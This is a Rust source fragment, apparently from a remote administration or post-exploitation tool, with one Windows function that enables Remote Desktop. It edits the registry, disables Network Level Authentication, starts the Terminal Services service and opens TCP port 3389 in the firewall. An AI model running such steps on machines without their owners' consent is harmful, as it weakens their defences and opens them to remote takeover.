// RDP activation function (Windows only)
#[cfg(windows)]
fn enable_rdp() -> String {
    use std::process::Command;

    println!("[+] Attempting to enable RDP via registry and firewall...");

    let mut result_output = String::new();

    // Step 1: Enable RDP in registry (fDenyTSConnections = 0)
    let reg_args = vec![
        "add",
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
        "/v",
        "fDenyTSConnections",
        "/t",
        "REG_DWORD",
        "/d",
        "0",
        "/f",
    ];

    match Command::new("reg").args(&reg_args).output() {
        Ok(output) => {
            result_output.push_str(&format!(
                "1. Registry (fDenyTSConnections): {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }
        Err(e) => {
            result_output.push_str(&format!("1. Registry command failed: {}\n", e));
        }
    }

    // Step 1b: Also set via PowerShell (more reliable for GUI sync)
    let ps_cmd = r#"Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force"#;
    match Command::new("powershell")
        .args(&["-Command", ps_cmd])
        .output()
    {
        Ok(_) => {
            result_output.push_str("   → PowerShell confirmation: OK\n");
        }
        Err(_) => {}
    }

    // Step 2: Disable Network Level Authentication (NLA) - often required
    let nla_args = vec![
        "add",
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
        "/v",
        "UserAuthentication",
        "/t",
        "REG_DWORD",
        "/d",
        "0",
        "/f",
    ];

    match Command::new("reg").args(&nla_args).output() {
        Ok(output) => {
            result_output.push_str(&format!(
                "2. Disable NLA: {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }
        Err(e) => {
            result_output.push_str(&format!("2. NLA command failed: {}\n", e));
        }
    }

    // Step 2b: Enable RDP via WMI (Windows Management Instrumentation)
    let wmi_cmd = r#"(Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\CIMV2\TerminalServices).SetAllowTSConnections(1,1)"#;
    match Command::new("powershell")
        .args(&["-Command", wmi_cmd])
        .output()
    {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("ReturnValue") && out.contains("0") {
                result_output.push_str("   → WMI configuration: SUCCESS ✓\n");
            } else if !out.trim().is_empty() {
                result_output.push_str(&format!("   → WMI result: {}\n", out.trim()));
            }
        }
        Err(_) => {}
    }

    // Step 3: Enable the Terminal Services service
    match Command::new("sc")
        .args(&["config", "TermService", "start=", "auto"])
        .output()
    {
        Ok(output) => {
            result_output.push_str(&format!(
                "3. Enable TermService: {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }
        Err(e) => {
            result_output.push_str(&format!("3. Service config failed: {}\n", e));
        }
    }

    // Step 4: Start the Terminal Services service
    match Command::new("net").args(&["start", "TermService"]).output() {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            let err = String::from_utf8_lossy(&output.stderr);
            if out.contains("already")
                || out.contains("déjà")
                || err.contains("already")
                || err.contains("déjà")
            {
                result_output.push_str("4. TermService: Already running ✓\n");
            } else if !out.is_empty() {
                result_output.push_str(&format!("4. Start TermService: {}\n", out.trim()));
            } else if !err.is_empty() {
                result_output.push_str(&format!("4. TermService: {}\n", err.trim()));
            } else {
                result_output.push_str("4. TermService: Started ✓\n");
            }
        }
        Err(e) => {
            result_output.push_str(&format!("4. Service start failed: {}\n", e));
        }
    }

    // Step 4b: Verify service status
    match Command::new("sc").args(&["query", "TermService"]).output() {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("RUNNING") {
                result_output.push_str("   → Service status: RUNNING ✓\n");
            } else if out.contains("STOPPED") {
                result_output.push_str("   → Service status: STOPPED ✗\n");
            } else {
                result_output.push_str(&format!(
                    "   → Service status: {}\n",
                    out.lines().nth(3).unwrap_or("Unknown")
                ));
            }
        }
        Err(_) => {}
    }

    // Step 5: Create firewall rule
    let fw_args = vec![
        "advfirewall",
        "firewall",
        "add",
        "rule",
        "name=Allow RDP",
        "dir=in",
        "action=allow",
        "protocol=TCP",
        "localport=3389",
    ];

    match Command::new("netsh").args(&fw_args).output() {
        Ok(output) => {
            result_output.push_str(&format!(
                "5. Firewall rule: {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }
        Err(e) => {
            result_output.push_str(&format!("5. Firewall command failed: {}\n", e));
        }
    }

    // Step 6: Verify final configuration
    result_output.push_str("\n--- Final Configuration Check ---\n");

    // Check fDenyTSConnections value
    match Command::new("reg")
        .args(&[
            "query",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
            "/v",
            "fDenyTSConnections",
        ])
        .output()
    {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("0x0") {
                result_output.push_str("✓ RDP is ENABLED in registry\n");
            } else if out.contains("0x1") {
                result_output.push_str("✗ RDP is DISABLED in registry\n");
            } else {
                result_output.push_str(&format!(
                    "Registry value: {}\n",
                    out.lines().last().unwrap_or("Unknown")
                ));
            }
        }
        Err(_) => {
            result_output.push_str("Could not verify registry setting\n");
        }
    }

    result_output.push_str("\n✓ RDP configuration completed. Try connecting now.");
    result_output
}

